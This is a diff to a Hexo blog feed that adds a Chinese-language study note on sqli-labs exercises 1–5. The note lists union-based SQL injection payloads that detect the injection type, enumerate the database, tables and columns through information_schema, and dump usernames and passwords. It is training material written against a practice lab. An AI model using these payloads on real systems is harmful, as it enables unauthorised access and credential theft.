@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2021-10-13T12:10:03.144Z</updated>
+  <updated>2021-10-21T15:45:19.254Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,23 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>labs-sqli 1-5</title>
+    <link href="http://example.com/2021/10/21/labs-sqli-1-5/"/>
+    <id>http://example.com/2021/10/21/labs-sqli-1-5/</id>
+    <published>2021-10-21T15:38:14.000Z</published>
+    <updated>2021-10-21T15:45:19.254Z</updated>
+    
+    <content type="html"><![CDATA[<p>labs-sqli 1-5题小结（虽然感觉还没大懂）</p><span id="more"></span><hr><h1>大体做题流程都是：</h1><br>先判断是字符型还是数字型<br><br>?id=1 <br><br>/*只有输入错误的类型报错我们才知道注入是哪种*/<br><br>确认字段位数<br><br>?id=1 order by 3<br><br>确认占位信息<br><br>/*使用基于报错的union联合查询,所以我们把id=1改成-1（一个正常来说肯定不存在的值）那它就能回显出我们要爆的东西*/<br><br>?id=-1 union select 1,2,3--+<br><br>找库名<br><br>?id=-1 union select 1,2,database() --+<br><br>找表名<br><br>?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+<br><br>/*group_concat()函数将组中的字符串连接成为字符串(就可以一次多爆出点我们需要的东西)<br><br>找字段名<br><br>?id=-1 union select 1,2,group_concat(column_name) from information_schema.COLUMNs where table_schema='security' and table_name='users'--+<br><br>找账号密码信息<br><br>?id=-1 union select 1,2,group_concat(concat_ws(',',username,password) SEPARATOR '|') from users --+<br>]]></content>
+    
+    
+    <summary type="html">&lt;p&gt;labs-sqli 1-5题小结（虽然感觉还没大懂）&lt;/p&gt;</summary>
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>sqli-labs 初入</title>
